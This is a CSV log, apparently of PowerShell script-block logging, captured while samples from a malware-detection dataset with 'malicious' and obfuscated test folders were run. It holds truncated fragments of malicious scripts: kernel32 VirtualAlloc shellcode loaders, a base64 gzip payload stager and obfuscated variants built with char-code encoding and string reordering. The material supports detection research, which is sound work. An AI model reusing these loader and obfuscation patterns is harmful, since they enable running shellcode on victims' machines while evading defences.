"8/6/2026 10:27:42 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1727.ps1","10407"," . ( $EnV:ComSPec[4,15,25]-join'')("" $( set  'OfS' '') "" +[StRIng][chaR[]] ( 105, 102 ,40, 91 ,73,110 , 116 , 80,116, 114 ,93,58,58,83 ,105 , 122,101, 32, 45 , 101 , 113, 32,52 , 41 ,123, 36,98, 61 , "
"8/6/2026 10:27:37 AM","","9","$global:?"
"8/6/2026 10:27:37 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:27:37 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:27:37 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:27:37 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:27:37 AM","","80","{ $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }"
"8/6/2026 10:27:37 AM","","519","function sdsfkKgtbg {
	Param ($ebaApCG2f4g, $uGYkJ)		
	$pIuRFP = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.d"
"8/6/2026 10:27:37 AM","","2676","function sdsfkKgtbg {
	Param ($ebaApCG2f4g, $uGYkJ)		
	$pIuRFP = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.d"
"8/6/2026 10:27:36 AM","","1960","$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAEloBVgCA71WbW/aOhT+3En7D9GERKJRApSta6VJ1wnvJRSaEgoMTW7iBBcTZ47TFnb33+8JJCu766befbgRKH55jn38nOf4xE9CV1IeKrEX+6uLQN4GytfXr46GWOC1ohbILUaR"
"8/6/2026 10:27:34 AM","","9","$global:?"
"8/6/2026 10:27:34 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1727.ps1","2326","if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop "
"8/6/2026 10:27:26 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:27:26 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:27:26 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:27:26 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:27:26 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1707.ps1","2236","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:27:18 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:27:18 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:27:18 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:27:18 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:27:18 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:27:18 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1707.ps1","2755","&( $SHelLiD[1]+$ShELlId[13]+'x')(((""{8}{25}{14}{13}{11}{35}{29}{19}{28}{16}{1}{33}{15}{18}{5}{39}{30}{6}{23}{31}{26}{12}{27}{21}{36}{41}{44}{24}{0}{7}{3}{37}{10}{34}{4}{9}{45}{32}{2}{22}{40}{46}{17}{4"
"8/6/2026 10:27:10 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:27:10 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:27:10 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:27:10 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:27:10 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:27:10 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1707.ps1","2687"," ('zDPc = LCR[DllImport(ysFkern'+'el32.dllysF'+')]public static extern IntPtr Vir'+'tualAlloc(IntPtr l'+'pAddress, uint dwSize, uint flAllocationType, uint '+'flProtect);[DllImport(ysFkernel32.dlly'+'"
"8/6/2026 10:27:02 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:27:02 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:27:02 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:27:02 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:27:02 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:27:02 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1707.ps1","22","{ ([inT]$_-AS[chAr]) }"
"8/6/2026 10:27:02 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1707.ps1","7654"," -JOin( '36T99<32<61!32}39T91r68{108T108T73T109{112{111T114c116F40}34z107F101{114F110X101F108}51F50}46F100z108z108{34X41c93{112z117X98}108z105<99T32{115<116z97{116T105F99c32T101z120{116X101z114}110X32"
"8/6/2026 10:26:54 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:26:54 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:26:54 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:26:54 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:26:54 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1707.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:26:46 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:26:46 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:26:46 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:26:46 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:26:46 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1690.ps1","2246","$Yiu = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:26:38 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:26:38 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:26:38 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:26:38 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:26:38 AM","","2241","$Yiu = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:26:38 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1690.ps1","2938",". ( $Pshome[4]+$PSHomE[34]+'X') (((""{38}{64}{26}{61}{5}{65}{37}{33}{68}{67}{20}{10}{66}{13}{16}{48}{60}{15}{31}{2}{44}{27}{32}{56}{11}{3}{35}{42}{53}{25}{0}{21}{34}{6}{52}{29}{19}{1}{9}{41}{51}{59}{47"
"8/6/2026 10:26:30 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:26:30 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:26:30 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:26:30 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:26:30 AM","","2241","$Yiu = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:26:30 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1690.ps1","2646","& ( ([StRiNG]$VeRBoSEPreFerEnCe)[1,3]+'X'-JOIN'')((('zK1Yiu = 5RT[DllImport(HJkkernel32.dl'+'lHJk)]publ'+'ic static'+' extern IntPtr Virt'+'ualAllo'+'c(IntPtr lpAddress, uin'+'t dwSize, uint flAllocat"
"8/6/2026 10:26:22 AM","","2243"," $Yiu = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/6/2026 10:26:22 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1690.ps1","25","{ ([INT] $_ -AS [chAR]) }"
"8/6/2026 10:26:22 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1690.ps1","7759",""" $( sEt-iteM 'VaRIABlE:OfS'  '' )""+[sTriNG]('36N89-105t117@32-61Q32e39Y91<68Q108N108Y73Q109r112N111-114r116N40<34-107Y101r114N110N101@108N51e50t46N100r108r108<34N41r93Z112r117N98-108N105Y99<32r115e11"
"8/6/2026 10:26:14 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:26:14 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:26:14 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:26:14 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:26:13 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1690.ps1","2241","$Yiu = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:26:06 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:26:06 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:26:06 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:26:06 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:26:05 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1681.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:25:58 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:25:58 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:25:58 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:25:58 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:25:58 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:25:57 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1681.ps1","2793","((""{33}{30}{3}{1}{18}{21}{19}{34}{32}{35}{28}{16}{14}{38}{42}{37}{6}{5}{20}{45}{24}{12}{25}{15}{36}{44}{11}{17}{26}{40}{31}{13}{8}{10}{9}{46}{27}{0}{4}{2}{23}{22}{29}{43}{39}{41}{7}"" -f 'xa2,0x56,0xff"
"8/6/2026 10:25:50 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:25:50 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:25:50 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:25:50 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:25:49 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:25:49 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1681.ps1","2585"," . ((gV '*mdR*').nAmE[3,11,2]-JoiN'')(('RSLc = WDx[DllImport(oN2kernel32.dlloN2)]public static ex'+'tern'+' Int'+'Ptr VirtualAlloc(IntPtr'+' lpAddress, uint dwSize, uint flAllocationType, uint flProte"
"8/6/2026 10:25:42 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:25:42 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:25:42 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:25:42 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:25:41 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:25:41 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1681.ps1","9853"," [ChAr[]] ( 36, 99,32 , 61 ,32, 39,91 ,68 , 108 ,108 ,73, 109,112 , 111, 114 ,116, 40 , 34 , 107 ,101 , 114 ,110, 101, 108 , 51 , 50,46 , 100 , 108 , 108, 34, 41 , 93 , 112 ,117 , 98,108,105 , 99, 32,"
"8/6/2026 10:25:34 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:25:34 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:25:34 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:25:34 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:25:33 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1681.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:25:26 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:25:26 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:25:26 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:25:26 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:25:25 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1678.ps1","2338","$L8Q = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:25:18 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:25:18 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:25:18 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:25:18 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:25:17 AM","","2331","$L8Q = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:25:17 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1678.ps1","3099"," . ( $ENV:coMSPEc[4,26,25]-jOin'')(((""{55}{68}{45}{53}{23}{57}{25}{11}{19}{24}{70}{66}{29}{30}{59}{54}{48}{52}{7}{5}{10}{26}{34}{46}{58}{21}{64}{56}{22}{51}{61}{38}{37}{40}{33}{49}{62}{60}{47}{43}{0}{"
"8/6/2026 10:25:09 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:25:09 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:25:09 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:25:09 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:25:09 AM","","2331","$L8Q = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:25:09 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1678.ps1","2783"," (('HDpL8Q = eSh[DllImport(HOZkernel32.dllHOZ)]public static extern IntPtr V'+'irtualAlloc(IntPtr lpAddress, uint dwSize,'+' uint flAllocationType, uint flProtect);[DllImport(HOZkernel32.dllHOZ)]publi"
"8/6/2026 10:25:01 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:25:01 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:25:01 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:25:01 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:25:01 AM","","2331","$L8Q = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:25:01 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1678.ps1","19","{ ([cHaR][int]$_) }"
"8/6/2026 10:25:01 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1678.ps1","7893"," -joIn ( '36,76I56,81Y32e61;32,39e91;68Y108z108,73W109,112Y111;114z116e40R34X107Y101R114z110e101Y108,51I50Y46Y100Y108;108W34W41R93R112,117R98M108R105;99;32X115;116W97I116I105z99z32;101I120e116z101I114"
"8/6/2026 10:24:53 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:24:53 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:24:53 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:24:53 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:24:53 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1678.ps1","2331","$L8Q = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:24:45 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:24:45 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:24:45 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:24:45 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:24:45 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1672.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:24:37 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:24:37 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:24:37 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:24:37 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:24:37 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:24:37 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1672.ps1","2917"," (((""{4}{6}{63}{39}{52}{68}{12}{44}{61}{7}{46}{11}{36}{15}{23}{25}{42}{27}{34}{41}{69}{10}{29}{49}{54}{38}{50}{16}{9}{47}{60}{22}{13}{57}{40}{3}{18}{37}{14}{66}{51}{20}{8}{35}{17}{65}{62}{5}{45}{26}{3"
"8/6/2026 10:24:29 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:24:29 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:24:29 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:24:29 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:24:29 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:24:29 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1672.ps1","2620","('h57c = VC0[DllImport(bw3kernel32.'+'dllbw3)]public static extern IntPtr VirtualA'+'lloc(IntPtr lpAddress, uint dwSize, uint flAllocation'+'Type, uint flProtect);[DllImport(bw3kernel32.dllbw3)]public"
"8/6/2026 10:24:21 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:24:21 AM","","2234","  $c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:24:21 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1672.ps1","19","{([ChAR] [INt]$_) }"
"8/6/2026 10:24:20 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1672.ps1","9915",""" $( seT-ItEm  'vARiabLE:OfS' '') ""+[stRING](( 36 , 99 , 32, 61, 32,39 , 91 ,68 , 108, 108 , 73, 109 ,112 ,111, 114,116, 40,34, 107, 101,114, 110 ,101 ,108,51 , 50, 46,100 ,108 , 108,34 ,41,93 , 112 ,"
"8/6/2026 10:24:13 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:24:13 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:24:13 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:24:13 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:24:12 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1672.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:24:05 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:24:05 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:24:05 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:24:05 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:24:04 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1671.ps1","2238","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:23:57 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:23:57 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:23:57 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:23:57 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:23:56 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:23:56 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1671.ps1","2785"," & ( $VerboSEprEFeREnCE.tOsTRING()[1,3]+'X'-joiN'') (((""{15}{1}{4}{36}{25}{27}{12}{8}{43}{23}{14}{38}{28}{26}{13}{11}{2}{3}{41}{6}{40}{7}{10}{35}{44}{32}{37}{39}{5}{42}{21}{0}{46}{16}{17}{34}{18}{30}{"
"8/6/2026 10:23:49 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:23:49 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:23:49 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:23:49 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:23:49 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:23:48 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1671.ps1","2614"," (('cLYc = Cx'+'Y[DllImport(VsOkernel32.dllVsO)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSiz'+'e, uint fl'+'Allocati'+'onType, uint flProtect);[DllImport(VsOkernel32.dllVsO)]p"
"8/6/2026 10:23:41 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:23:41 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:23:41 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:23:41 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:23:40 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:23:40 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1671.ps1","20","{ ( [ChAr][iNT]$_) }"
"8/6/2026 10:23:40 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1671.ps1","7663","& ( $shellid[1]+$sHElLID[13]+'X')( ( '36X99y32_61r32a39l91a68a108y108r73@109r112X111y114X116a40l34a107i101y114r110l101r108a51@50r46r100i108w108X34_41l93y112X117i98_108i105l99r32w115_116r97X116r105a99i"
"8/6/2026 10:23:33 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
